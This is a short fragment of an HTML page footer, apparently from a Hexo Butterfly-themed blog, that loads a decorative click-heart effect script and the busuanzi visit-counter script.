+}</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
